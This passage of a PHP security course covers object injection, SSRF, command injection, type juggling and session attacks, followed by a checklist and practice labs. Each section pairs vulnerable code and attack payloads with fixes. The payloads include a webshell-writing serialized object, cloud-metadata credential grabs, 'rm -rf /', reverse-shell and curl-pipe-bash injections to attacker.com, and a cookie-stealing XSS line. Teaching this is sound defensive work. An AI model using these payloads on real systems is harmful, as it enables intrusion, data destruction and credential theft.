+<h3>Vulnerable Code</h3>
+
+<pre><code>&lt;?php
+class FileManager {
+    public string $path;
+    public function __destruct() {
+        // Attacker controls $this-&gt;path via serialized payload
+        if (file_exists($this-&gt;path)) {
+            unlink($this-&gt;path);
+        }
+    }
+}
+
+class Logger {
+    public string $logFile;
+    public string $message;
+    public function __wakeup() {
+        file_put_contents($this-&gt;logFile, $this-&gt;message, FILE_APPEND);
+    }
+}
+
+// Somewhere in the app:
+$data = unserialize(base64_decode($_COOKIE['session']));
+?&gt;</code></pre>
+
+<h3>The Attack</h3>
+
+<p>Attacker crafts a payload:</p>
+
+<pre><code>O:11:"FileManager":1:{s:4:"path";s:12:"/etc/passwd";}</code></pre>
+
+<p>When the request ends, PHP destroys the <code>FileManager</code> object and calls <code>__destruct()</code>, which deletes <code>/etc/passwd</code>.</p>
+
+<p>For the <code>Logger</code> class, the attacker sends:</p>
+
+<pre><code>O:6:"Logger":2:{s:7:"logFile";s:20:"/var/www/html/shell.php";
+s:7:"message";s:30:"&lt;?php system($_GET['c']); ?&gt;";}</code></pre>
+
+<p>PHP calls <code>__wakeup()</code> during deserialization, writing a PHP webshell to the webroot. Full RCE.</p>
+
+<h3>Real-World Chains (POP Chains)</h3>
+
+<div class="theory">
+Sophisticated exploits chain multiple classes together. Class A's <code>__destruct</code> calls a method on Class B, which calls <code>__toString</code> on Class C, which finally reaches a dangerous gadget in Class D. These chains exist for Laravel, Symfony, Monolog, Guzzle, Doctrine, WordPress plugins, and dozens more.
+</div>
+
+<p>Tools:</p>
+<ul>
+  <li><strong>PHPGGC</strong> — generates ready-made chains: <code>./phpggc Laravel/RCE1 system id</code></li>
+  <li><strong>ysoserial</strong> — the Java equivalent (for comparison)</li>
+</ul>
+
+<h3>Mitigation</h3>
+
+<pre><code>&lt;?php
+// NEVER deserialize untrusted input. Use JSON:
+$data = json_decode($input, true, 512, JSON_THROW_ON_ERROR);
+
+// If you MUST use unserialize, restrict classes:
+$data = unserialize($input, ['allowed_classes' =&gt; false]);
+// or whitelist specific classes:
+$data = unserialize($input, ['allowed_classes' =&gt; [DateTime::class]]);
+
+// Sign serialized data with HMAC before storing
+$data = base64_encode(serialize($object));
+$sig  = hash_hmac('sha256', $data, SECRET_KEY);
+// Store "$data.$sig" and verify before unserializing
+?&gt;</code></pre>
+
+<div class="security">
+<strong>The single best defense:</strong> replace <code>serialize()</code>/<code>unserialize()</code> with <code>json_encode()</code>/<code>json_decode()</code> wherever possible. JSON has no concept of classes or magic methods, so POI is structurally impossible.
+</div>
+
+<h2>8.7 Server-Side Request Forgery (SSRF)</h2>
+
+<div class="theory">
+SSRF occurs when an application fetches a URL supplied by the user. The attacker can point the URL at internal services — including the cloud provider's metadata endpoint — and leak sensitive credentials.
+</div>
+
+<h3>Vulnerable Code</h3>
+
+<pre><code>&lt;?php
+$url = $_GET['url'];
+echo file_get_contents($url);
+?&gt;</code></pre>
+
+<h3>Attack Payloads</h3>
+
+<pre><code># AWS metadata service — steal IAM credentials
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Google Cloud metadata
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Internal admin panel
+?url=http://localhost:8080/admin
+
+# Port scan internal network
+?url=http://192.168.1.1:22
+
+# Bypass simple filters with DNS rebinding or decimal IP
+?url=http://2130706433/           # 127.0.0.1 as decimal
+?url=http://0x7f000001/           # hex
+?url=http://[::1]/                # IPv6 localhost
+</code></pre>
+
+<h3>Mitigation</h3>
+
+<pre><code>&lt;?php
+function safeFetch(string $url): string {
+    // 1. Parse URL
+    $parts = parse_url($url);
+    if (!in_array($parts['scheme'] ?? '', ['http', 'https'], true)) {
+        throw new RuntimeException("Bad scheme");
+    }
+
+    // 2. Resolve hostname to IP
+    $host = $parts['host'];
+    $ip   = gethostbyname($host);
+
+    // 3. Block private/loopback/link-local ranges
+    $blocked = [
+        '127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12',
+        '192.168.0.0/16', '169.254.0.0/16', '::1/128',
+        'fc00::/7', 'fe80::/10',
+    ];
+    if (isBlockedIp($ip, $blocked)) {
+        throw new RuntimeException("Blocked IP");
+    }
+
+    // 4. Fetch with timeout and follow-location disabled
+    $ctx = stream_context_create([
+        'http' =&gt; [
+            'timeout' =&gt; 5,
+            'follow_location' =&gt; 0,
+            'max_redirects' =&gt; 0,
+        ],
+    ]);
+    return file_get_contents($url, false, $ctx, 0, 1_000_000);   // max 1MB
+}
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Best practice:</strong> if you don't absolutely need to fetch arbitrary URLs, use a <strong>whitelist</strong> of allowed hosts. That alone defeats SSRF completely. If you need arbitrary URLs, use a proxy service that handles the IP restrictions for you.
+</div>
+
+<h2>8.8 Command Injection</h2>
+
+<div class="theory">
+Command injection occurs when user input is passed to a shell command without escaping. The attacker appends shell metacharacters (<code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, <code>`</code>) to run arbitrary commands.
+</div>
+
+<h3>Vulnerable Code</h3>
+
+<pre><code>&lt;?php
+$ip = $_GET['ip'];
+system("ping -c 1 $ip");
+?&gt;</code></pre>
+
+<h3>Attack Payloads</h3>
+
+<pre><code>?ip=127.0.0.1; cat /etc/passwd
+?ip=127.0.0.1 &amp;&amp; rm -rf /
+?ip=127.0.0.1 | nc attacker.com 4444
+?ip=$(curl attacker.com/shell.sh | bash)
+?ip=`id`
+</code></pre>
+
+<h3>Mitigation</h3>
+
+<pre><code>&lt;?php
+// BEST — avoid the shell entirely
+filter_var($ip, FILTER_VALIDATE_IP) or die("Bad IP");
+$output = shell_exec("ping -c 1 " . escapeshellarg($ip));
+
+// If you must run a command with arguments:
+$safeIp = escapeshellarg($ip);
+system("ping -c 1 $safeIp");
+
+// For binaries, use full paths
+system("/usr/bin/ping -c 1 $safeIp");
+
+// Avoid exec/system/shell_exec/popen/proc_open unless absolutely necessary
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Prefer native PHP functions over shell commands</strong> wherever possible. <code>file_get_contents()</code> instead of <code>curl</code>. <code>getimagesize()</code> instead of <code>file</code>. <code>mkdir()</code> instead of <code>mkdir -p</code>. Every shell command is a potential injection point.
+</div>
+
+<h2>8.9 Type Juggling Vulnerabilities</h2>
+
+<div class="theory">
+PHP's loose comparison (<code>==</code>) coerces types. This is the source of the "magic hash" bug and many authentication bypasses.
+</div>
+
+<h3>The Magic Hash Attack</h3>
+
+<pre><code>&lt;?php
+// Vulnerable
+if ($_POST['password'] == $storedMd5Hash) {
+    login();
+}
+
+// If $storedMd5Hash is "0e1234567890abcdef..." (starts with 0e)
+// Then ANY string that also evaluates to 0 works:
+// $_POST['password'] = "0e4567890abcdef..."  → both evaluate to 0 → TRUE
+?&gt;</code></pre>
+
+<p>Strings known to produce <code>0e...</code> MD5 hashes:</p>
+
+<pre><code>240610708  →  0e462097431906509019562988736854
+QNKCDZO    →  0e830400451993494058024219903391
+aabg7XSs   →  0e087386482136013740957780965295
+</code></pre>
+
+<h3>Mitigation</h3>
+
+<pre><code>&lt;?php
+// ALWAYS use strict comparison
+if ($_POST['password'] === $storedHash) { ... }
+
+// ALWAYS use hash_equals for timing-safe comparison
+if (hash_equals($storedHash, hash('sha256', $password))) { ... }
+
+// NEVER compare hashes with == or ===
+// ALWAYS use password_verify() for passwords
+if (password_verify($password, $hash)) { ... }
+?&gt;</code></pre>
+
+<div class="security">
+<strong>Rule:</strong> in any security-relevant comparison — password checks, token validation, cookie integrity, hash verification — always use <code>===</code> and <code>hash_equals()</code>. Never trust <code>==</code>.
+</div>
+
+<h2>8.10 Session Attacks</h2>
+
+<h3>Session Fixation</h3>
+
+<div class="theory">
+The attacker sets a known session ID on the victim before the victim logs in. When the victim logs in, the session ID doesn't change, and the attacker — who already knows it — can use it.
+</div>
+
+<pre><code># Attack flow:
+1. Attacker obtains a valid session ID (e.g., SID=ABC) by visiting the site
+2. Attacker tricks victim into using SID=ABC (via URL, XSS, or meta refresh)
+3. Victim logs in with SID=ABC
+4. Server sees successful login for SID=ABC
+5. Attacker sends SID=ABC → authenticated as victim
+</code></pre>
+
+<p><strong>Mitigation:</strong></p>
+
+<pre><code>&lt;?php
+// Call this IMMEDIATELY after any privilege change
+session_regenerate_id(true);
+
+// On login, on role change, on logout
+?&gt;</code></pre>
+
+<h3>Session Hijacking via XSS</h3>
+
+<p>If cookies are not <code>httponly</code>, XSS can read them and exfiltrate:</p>
+
+<pre><code>&lt;script&gt;new Image().src = "https://attacker.com/?c=" + document.cookie;&lt;/script&gt;</code></pre>
+
+<p><strong>Mitigation:</strong></p>
+
+<pre><code>&lt;?php
+session_set_cookie_params([
+    'httponly' =&gt; true,       // JS cannot read
+    'secure'   =&gt; true,       // HTTPS only
+    'samesite' =&gt; 'Strict',   // no cross-site
+]);
+session_start();
+?&gt;</code></pre>
+
+<h3>Session ID in URLs</h3>
+
+<div class="security">
+If <code>session.use_trans_sid = On</code>, PHP embeds the session ID in URLs (<code>?PHPSESSID=abc</code>). This leaks the session via Referer headers, browser history, and shared links. <strong>Always set <code>session.use_only_cookies = 1</code> and <code>session.use_trans_sid = 0</code>.</strong>
+</div>
+
+<h2>8.11 The Capstone — Building the Secure Exam Portal</h2>
+
+<div class="theory">
+Now let's apply everything to the exam portal you've been building. Here's what each lesson adds to the final architecture:
+</div>
+
+<table>
+<tr><th>Level</th><th>Applied To</th></tr>
+<tr><td>1</td><td>Superglobals are always untrusted — validate every input</td></tr>
+<tr><td>2</td><td>Use strict types and <code>match</code> for routing</td></tr>
+<tr><td>3</td><td>Whitelist roles with <code>in_array(strict: true)</code>; escape output with <code>htmlspecialchars</code></td></tr>
+<tr><td>4</td><td>Model with classes; protect invariants; never trust magic methods</td></tr>
+<tr><td>5</td><td>Sessions with <code>regenerate_id</code>; uploads with <code>finfo</code> verification; uploads outside webroot</td></tr>
+<tr><td>6</td><td>All queries via PDO with <code>EMULATE_PREPARES=false</code>; transactions for multi-step writes</td></tr>
+<tr><td>7</td><td>PSR-4 autoloading; Composer for libraries; generators for bulk CSV processing</td></tr>
+<tr><td>8</td><td>CSRF tokens on all POST forms; escape every output; block POI, SSRF, LFI, command injection</td></tr>
+</table>
+
+<h3>Deployment Checklist for Your Portal</h3>
+
+<pre><code>☐ All inputs validated and sanitized
+☐ All SQL through prepared statements (EMULATE_PREPARES = false)
+☐ All output escaped with htmlspecialchars(context-aware)
+☐ CSRF tokens on every state-changing form
+☐ Session cookies: httponly, secure, samesite=Strict
+☐ session_regenerate_id(true) on login and privilege change
+☐ Passwords hashed with password_hash(PASSWORD_ARGON2ID)
+☐ Rate limiting on login and OTP endpoints
+☐ Uploads validated with finfo + random names + stored outside webroot
+☐ Error display OFF in production; log_errors ON
+☐ HTTPS enforced (HSTS header)
+☐ CSP, X-Frame-Options, X-Content-Type-Options headers set
+☐ Database user has minimal privileges (no DROP, no FILE)
+☐ .env file outside webroot; secrets never committed
+☐ Backups configured and tested
+☐ Dependencies audited with composer audit
+☐ Logs monitored for anomalies
+</code></pre>
+
+<h2>8.12 Level 8 Practice (Final)</h2>
+
+<div class="practice">
+<ol>
+  <li><strong>SQLi lab:</strong> Build a vulnerable <code>login.php</code> using <code>$pdo-&gt;query()</code>. Bypass it with <code>' OR 1=1 --</code>. Then fix it with prepared statements and confirm the same payload fails.</li>
+  <li><strong>XSS lab:</strong> Build a comment system that echoes input raw. Inject <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> and confirm it runs. Fix it with <code>htmlspecialchars</code>.</li>
+  <li><strong>CSRF lab:</strong> Build a "delete account" page with no CSRF protection. Craft an HTML page that triggers it when loaded. Then add CSRF tokens and confirm the attack fails.</li>
+  <li><strong>POI demonstration:</strong> Write a class with a <code>__destruct</code> that deletes a file. Call <code>unserialize()</code> on user input. Craft the payload manually. Then fix it with <code>allowed_classes =&gt; false</code>.</li>
+  <li><strong>LFI lab:</strong> Build a <code>?page=</code> router that <code>include()</code>s user input. Read <code>/etc/passwd</code>. Fix it with a whitelist.</li>
+  <li><strong>Upload lab:</strong> Build an upload form with no validation. Upload a PHP webshell. Confirm it executes. Then add the full mitigation stack.</li>
+  <li><strong>Security audit:</strong> Take your exam portal. Go through the checklist above. Fix every gap. Write a one-page report.</li>
+  <li><strong>Bug bounty simulation:</strong> Find a public PHP project on GitHub. Search for <code>$_(GET|POST|COOKIE|REQUEST)</code> used in <code>query</code>, <code>include</code>, <code>exec</code>, or <code>unserialize</code>. Report what you find (responsibly — never against a live target you don't own).</li>
+</ol>
+</div>
+
+<div class="page-break"></div>
+
+<h1 style="text-align:center; padding:60px 20px; border:none; color:#4a148c;">🎓  COURSE COMPLETE</h1>
+
+<div style="text-align:center; padding:20px 30px; max-width:700px; margin:0 auto; color:#555;">
+<p>You've covered all 8 levels of PHP — from <code>echo "Hello, World"</code> to understanding PHP object injection chains, SSRF, command injection, and CSRF.</p>
+<p style="margin-top:20px;">The next steps from here:</p>
+<ul style="text-align:left; display:inline-block; margin-top:10px;">
+  <li><strong>Build a real project</strong> — blog, forum, e-commerce. Ship it.</li>
+  <li><strong>Learn a framework</strong> — Laravel is the standard. Study its security features.</li>
+  <li><strong>Study OWASP Top 10</strong> — read it, do the labs at PortSwigger Academy.</li>
+  <li><strong>Get certified</strong> — OSCP, eWPT, or Bug Bounty Hunter (HackerOne).</li>
+  <li><strong>Contribute to open source</strong> — audit PHP libraries, report bugs, submit fixes.</li>
+</ul>
+<p style="margin-top:30px; font-size:0.95em; font-style:italic;">
+"Understanding how code breaks is how you learn to write code that doesn't."
+</p>
+<p style="margin-top:40px; font-size:0.85em; color:#888;">
+<strong>@UnknownGuy9876</strong> · <strong>@SGCodexs</strong><br>
+💀 DEVILS WILL RISE 💀
+</p>
+</div>
+
+</body>
+</html>
